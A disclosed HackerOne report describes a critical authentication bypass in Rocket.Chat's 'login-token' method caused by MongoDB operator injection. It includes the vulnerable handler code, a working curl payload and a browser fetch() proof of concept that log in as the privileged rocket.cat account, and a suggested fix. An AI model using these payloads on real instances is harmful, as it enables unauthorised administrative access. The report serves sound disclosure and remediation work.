# Authentication Bypass in login-token Authentication Method

## Report Details
- **Report ID**: 1447619
- **URL**: https://hackerone.com/reports/1447619
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-01-12T01:53:41.301Z
- **Disclosed**: 2024-08-10T21:57:39.310Z

## Reporter
- **Username**: gronke
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rocket_chat

## Vulnerability Information
## Summary

Improper input data validation in the `login-token` authentication method leads to an authentication bypass.

## Description

Data from HTTP POST requests is forwarded to hardcoded Login Handlers, including the `login-token` method defined in [app/token-login/server/login_token_server.js#L10](https://github.com/RocketChat/Rocket.Chat/blob/a06e811ceeef6f674ff8c38e49ddcf0f476d9683/app/token-login/server/login_token_server.js#L10).

```javascript
Accounts.registerLoginHandler('login-token', function (result) {
	if (!result.loginToken) {
		return;
	}

	const user = Meteor.users.findOne({
		'services.loginToken.token': result.loginToken,
	});

	if (user) {
		Meteor.users.update({ _id: user._id }, { $unset: { 'services.loginToken': 1 } });

		return {
			userId: user._id,
		};
	}
});
```

The `result.loginToken` parameter is taken from the HTTP POST requests JSON body of the `/api/v1/login` route, so that Mongo DB injection returns a valid authToken for the first matching user. 

```console
$ curl -s 'http://127.0.0.1:3000/api/login' -H "Content-Type: application/json" -d '{"loginToken": { "$exists": false }}' | head
{
  "status": "success",
  "data": {
    "userId": "rocket.cat",
    "authToken": "MnTHVIRTZfRBQiFQYzWZ1xbBlL4BUwK2-3UBWTftXpB",
    "me": {
      "_id": "rocket.cat",
      "avatarOrigin": "local",
      "name": "Rocket.Cat",
      "username": "rocket.cat",
```

Typically the first user in a Rocket.Chat MongoDB database is `rocket.cat`, which is a privileged account. This can be confirmed by using the returned secret in an API call to `/api/v1/me`:

```console
$ curl -H "x-user-id: rocket.cat" -H "x-auth-token: MnTHVIRTZfRBQiFQYzWZ1xbBlL4BUwK2-3UBWTftXpB" http://127.0.0.1:3000/api/v1/me              
{                                                                                                                                                                        
  "_id": "rocket.cat",                                                                                                                                                   
  "avatarOrigin": "local",                                                                                                                                               
  "name": "Rocket.Cat",                                                                                                                                                  
  "username": "rocket.cat",                                                                                                                                              
  "status": "away",                                                                                                                                                      
  "statusDefault": "online",                                                                                                                                             
  "utcOffset": 1,                                                                                                                                                        
  "active": true,                                                                                                                                                        
  "_updatedAt": "2022-01-12T01:45:57.208Z",                                                                                                                              
  "roles": [
    "bot"
  ],
```

When loginToken is legitimately used an attacker would need to switch the strategy from using `$empty` to `$regex` instead.

## Releases Affected:

  * 4.3.1
  * 3.18.3
  * develop

## Steps To Reproduce (from initial installation to vulnerability):

  1. Open Rocket.Chat (logged out)
  2. Open Web Inspector
  3. Run PoC Request

## Supporting Material/References:

### Proof of Concept

```javascript
fetch("/api/v1/login", {
  method: "POST",
  body: '{"loginToken": { "$exists": false }}',
  headers: {
    "Content-Type": "application/json"
  }
})
.then(res => res.json())
.then(({ data: { userId, authToken }}) => {
  console.log(`login as ${userId}`)
  Meteor._localStorage.setItem(Accounts.USER_ID_KEY, userId);
  Meteor._localStorage.setItem(Accounts.LOGIN_TOKEN_KEY, authToken);
  window.location.reload()
});
```

## Suggested mitigation

  * Validate `result.loginToken` input data in loginToken auth handler.

## Impact

Unauthenticated clients can bypass the login and obtain administrative access to the Rocket.Chat instance.

## Attachments
No attachments
